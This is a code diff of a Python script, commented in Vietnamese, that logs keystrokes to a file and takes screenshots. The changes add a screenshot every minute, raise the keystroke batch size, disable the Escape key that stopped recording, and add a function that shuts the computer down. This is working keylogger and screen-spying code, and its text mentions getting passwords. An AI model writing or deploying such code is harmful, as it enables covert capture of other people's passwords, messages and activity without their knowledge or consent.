@@ -5,6 +5,7 @@ import time
 from datetime import datetime
 import pyautogui
 from pynput.keyboard import Key, Listener
+import os
 
 
 # Đọc file
@@ -78,8 +79,6 @@ def C_run():
         time.sleep(6)
         print("Get password again")
 
-
-
 def notify(from_to, t):
     s="0"
     d="0"
@@ -97,6 +96,12 @@ def take_screen_shot(file_name):
   image.save(file_name)
   take_screen_shot("test.jpg")
 
+def take_in_1m():
+    while True:
+        time.sleep(60)
+        file_name = str(datetime.date(datetime.now())) + " " + getCurrentTime() + ".jpg"
+        take_screen_shot(file_name)
+
 # Key record
 a = []
 
@@ -105,25 +110,34 @@ def writefile(a):
     for key in a:
         k = str(key).replace("'", "")
         f.write(k + " ")
+    f.write("\n")
     a.clear()
 
 
 def on_press(key):
     a.append(key)
-    if len(a) > 20:
+    if len(a) > 50:
         writefile(a)
 
 def on_release(key):
     # stop record keyboard
-    if key == Key.esc:
-        return False
+    # if key == Key.esc:
+    #    writefile(a)
+    #    return False
+    pass
 
+def record_key():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# Shutdown he thong
+def shut():
+    os.system("shutdown /s /t 1")
 
 # Main program
 if __name__ == '__main__':
     pass
     # getCurrentTime()
     # C_run()
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
+    # record_key()
 
